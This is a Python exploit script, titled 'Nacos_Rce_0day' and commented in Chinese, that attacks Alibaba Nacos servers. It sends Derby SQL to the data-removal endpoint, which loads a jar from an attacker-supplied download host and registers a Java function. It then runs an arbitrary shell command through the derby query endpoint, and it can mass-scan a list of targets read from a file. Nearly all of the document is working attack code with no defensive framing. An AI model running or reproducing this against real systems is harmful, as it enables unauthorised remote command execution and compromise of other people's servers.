import argparse
import random
import sys
import requests
from urllib.parse import urljoin

from colorama import Fore

# proxy = {
#     'https': 'http://127.0.0.1:8080',
#     'http': 'http://127.0.0.1:8080'
# }
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 				Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67'
}


# 按装订区域中的绿色按钮以运行脚本。
def exploit(target, command, service, args):
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    print("正在进行碰撞,请耐心等待!!")
    for i in range(0, sys.maxsize):
        try:
            id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
            post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
            CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
            CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(
                id=id, service=service);
            option_sql = "UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id,
                                                                                                              cmd=command);
            get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(
                id=id, cmd=command);
            # get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
            files = {'file': post_sql}
            post_resp = requests.post(url=removal_url, files=files, verify=False, headers=header, timeout=5)
            post_json = post_resp.json()
            if args.url:
                print(post_json)
            if post_json.get('message', None) is None and post_json.get('data', None) is not None:
                print(post_resp.text)
                get_resp = requests.get(url=derby_url, params={'sql': get_sql}, verify=False, headers=header,
                                        timeout=5)
                print(Fore.RED + f"\n[+] {target} 存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
                print(Fore.RED + f"[+] 返回的结果如下: {get_resp.text}" + Fore.RESET)
                break
            if (post_json['code'] == 404 or post_json['code'] == 403) or "File" not in post_json['message']:
                print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
                break
        except Exception as e:
                continue


if __name__ == '__main__':
    # 设置参数 -u 和 -f
    print(Fore.CYAN + """

    _   __                           ____                ____      __           
   / | / /___ __________  _____     / __ \________      / __ \____/ /___ ___  __
  /  |/ / __ `/ ___/ __ \/ ___/    / /_/ / ___/ _ \    / / / / __  / __ `/ / / /
 / /|  / /_/ / /__/ /_/ (__  )    / _, _/ /__/  __/   / /_/ / /_/ / /_/ / /_/ / 
/_/ |_/\__,_/\___/\____/____/____/_/ |_|\___/\___/____\____/\__,_/\__,_/\__, /  
                           /_____/              /_____/                /____/   

        人外有人，天外有天                     
        """ + Fore.RESET + Fore.RED +
          """                                       --By fkalis
          """ + Fore.RESET)
    parser = argparse.ArgumentParser(description='Nacos_Rce_0day')
    parser.add_argument('-p', '--port', type=int, default=5000, help='远程服务器地址')
    parser.add_argument('-t', '--target', default="127.0.0.1", help='远程服务器ip')
    parser.add_argument('-u', '--url', help='目标url')
    parser.add_argument('-f', '--file', help='目标文件')
    parser.add_argument('-c', '--command', default="whoami", help='Command to execute')
    args = parser.parse_args()
    service = 'http://{host}:{port}/download'.format(host=args.target, port=args.port)
    command = args.command
    if args.url:
        if not args.url.startswith('https://') and not args.url.startswith('http://'):
            target = r'http://' + args.url
        else:
            target = args.url
        try:
            exploit(target=target, command=command, service=service, args=args)
        except Exception as e:
                    print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
    if args.file:
        with open(args.file, 'r', encoding="utf-8", errors="ignore") as f:
            for line in f.readlines():
                target = line.strip()
                # 如果url没有包括https
                if not target.startswith('https://') and not target.startswith('http://'):
                    target = r'http://' + target
                print(Fore.GREEN + '[+]' + Fore.RESET + ' 正在检测: {}'.format(target))
                try:
                    exploit(target=target, command=command, service=service, args=args)
                except Exception as e:
                    print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
                    continue
